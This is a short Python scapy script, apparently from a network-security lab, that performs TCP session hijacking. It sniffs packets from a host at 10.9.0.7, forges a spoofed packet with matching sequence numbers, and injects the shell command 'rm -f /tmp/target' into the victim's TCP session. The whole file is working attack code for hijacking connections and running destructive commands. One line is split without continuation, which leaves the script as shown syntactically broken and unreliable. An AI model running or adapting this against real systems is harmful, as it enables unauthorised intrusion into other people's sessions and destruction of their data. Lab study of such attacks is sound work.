#!/usr/bin/env python3 
from scapy.all import * 
# avoid resend 
times, limit = 0,1 
def spoof(pkt): 
    global times 
    global limit 
    if(pkt[TCP].flags == 'PA' and times < limit): 
        next_ack = pkt[TCP].seq + len(pkt[Raw].load) 
        if pkt.haslayer(Raw) else 0 
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src) 
        tcp = TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="PA",seq=pkt [TCP].ack, ack=next_ack) 
        data = "\n rm -f /tmp/target\n" 
        new_pkt = ip/tcp/data 
        ls(new_pkt) 
        send(new_pkt,verbose=0) 
        print("A packet send") 
        times += 1 
sniff(filter='ip src 10.9.0.7 and tcp',iface="br-1ac8f49cbf4c",prn=spoof)
